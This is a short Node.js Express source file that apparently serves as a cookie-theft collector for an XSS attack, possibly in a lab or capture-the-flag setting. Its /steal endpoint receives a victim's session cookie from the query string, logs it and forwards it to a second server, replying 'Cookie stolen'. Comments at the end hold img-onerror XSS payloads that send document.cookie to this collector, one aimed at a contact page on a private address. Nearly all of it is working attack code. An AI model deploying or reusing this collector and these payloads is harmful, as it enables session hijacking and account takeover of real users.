const express = require('express');
const app = express();
const http = require('http');


app.get('/steal', (req, res) => {
  const cookieValue = req.query.cookie;
  console.log('Session cookie value:', cookieValue);

  // Send a request to a server with the stolen cookie
  const options = {
    hostname: 'localhost',
    port: 13377,
    path: '/storecookie',
    method: 'POST'
  };

  const req2 = http.request(options, (res2) => {
    console.log(`Server responded with status code: ${res2.statusCode}`);
    res.send('Cookie stolen and sent to server! LOL pwned so bad :\'(');
  });

  req2.on('error', (error) => {
    console.error(error);
    res.send('Failed to send cookie to server.');
  });

  // send the cookie value as the request body
  req2.write(cookieValue);
  req2.end();
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});

{/* <img src="" onerror="window.location.href = 'http://localhost:3000/steal?cookie=' + document.cookie;"> */}

// http://192.168.2.98:65352/contact
// XSS Payload that uses my own cookie, "xxxx", and replaces the admin cookie with my own cookie once ran
// <img src="" onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:3000/steal?cookie=' + document.cookie.replace('admin=xxxx', 'admin=xxxx'), true); xhr.send();">